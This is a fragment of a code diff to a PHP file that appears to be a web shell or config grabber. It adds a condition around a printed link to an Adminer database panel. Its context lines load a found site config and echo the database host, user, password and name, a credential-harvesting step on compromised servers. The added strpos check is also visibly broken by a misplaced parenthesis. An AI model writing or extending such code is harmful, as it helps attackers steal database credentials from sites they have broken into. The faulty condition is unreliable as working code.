@@ -2223,17 +2223,20 @@ Link Config: <br>
 
                     	
 
-      
-                        echo "<br>Adminer :";
-                        if (file_exists($lapor7)) {
-                        	echo "<a href='//".$fullxx.str_replace($_SERVER['DOCUMENT_ROOT'], "", $lapor7)."'>".$fullxx.str_replace($_SERVER['DOCUMENT_ROOT'], "", $lapor7)."</a><br>";
-                        }
+      					if( strpos(mari_get_contents($lapor7),"WordPress" === false)) {
+    
+	                        echo "<br>Adminer :";
+	                        if (file_exists($lapor7)) {
+	                        	echo "<a href='//".$fullxx.str_replace($_SERVER['DOCUMENT_ROOT'], "", $lapor7)."'>".$fullxx.str_replace($_SERVER['DOCUMENT_ROOT'], "", $lapor7)."</a><br>";
+	                        }
+	                    }    
                         if (file_exists($lapor8)) {
                             require_once($lapor8);
                             echo DB_HOST."<br>";
                             echo DB_USER."<br>";
                             echo DB_PASSWORD."<br>";
                             echo DB_NAME."<br>";
+                            
                         } 
 					} else {
 
